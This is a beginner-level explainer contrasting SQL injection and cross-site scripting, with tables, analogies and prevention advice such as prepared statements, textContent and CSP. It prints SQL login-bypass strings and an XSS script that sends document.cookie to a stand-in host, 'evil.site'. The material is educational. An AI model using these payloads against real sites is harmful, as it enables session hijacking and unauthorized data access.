# 🛡️ SQL Injection vs XSS — A Beginner-Friendly Security Comparison

| Feature                  | **SQL Injection**                                                                 | **Cross-Site Scripting (XSS)**                                      |
|--------------------------|-----------------------------------------------------------------------------------|---------------------------------------------------------------------|
| **What is it?**          | Attacking the database via user input (e.g., login forms)                        | Injecting malicious JavaScript into a web page                      |
| **Target**               | Database (e.g., MySQL, PostgreSQL)                                                | Browser/Client-side                                                 |
| **Intent**               | Steal data, bypass login, destroy records                                        | Steal cookies, deface pages, run unauthorized scripts               |
| **Example Attack**       | `admin' OR 1=1 --` (bypasses login)                                               | `<script>alert('Hacked')</script>` in a comment box                |
| **Damage Potential**     | Very High – full DB access, data loss                                             | High – session hijack, phishing, or browser control                 |
| **Exploits**             | Weak SQL query construction                                                       | Unsanitized innerHTML or user input rendered into the DOM           |
| **How to Prevent**       | - Use **Prepared Statements** / ORM<br>- Validate inputs<br>- Least DB privilege | - Use **textContent** not innerHTML<br>- Escape input<br>- CSP      |
| **Testing Tools**        | SQLMap, Burp Suite, Manual payload testing                                        | XSS-Scanner, DevTools, Browser Plugins                             |

---

## 🧠 Simple Analogy

**SQLi**: Like giving someone control over the *lock* on your bank vault.  
**XSS**: Like letting someone *write on your website* using your name.

---

## 🧪 Real-World Scenario

**SQL Injection**:  
A login form uses:
```sql
SELECT * FROM users WHERE username = '$input'
```
If input = `admin' --`, it becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --'
```
Which logs the attacker in.

**XSS**:  
A comment section renders user input with:
```html
<div>${userComment}</div>
```
Attacker posts:
```html
<script>fetch('http://evil.site/steal?cookie=' + document.cookie)</script>
```

---

## ✅ Summary

| SQLi                   | XSS                     |
|------------------------|-------------------------|
| Attacks backend (DB)   | Attacks frontend (User) |
| Can destroy data       | Can hijack sessions     |
| Prevent via query control | Prevent via HTML sanitization |
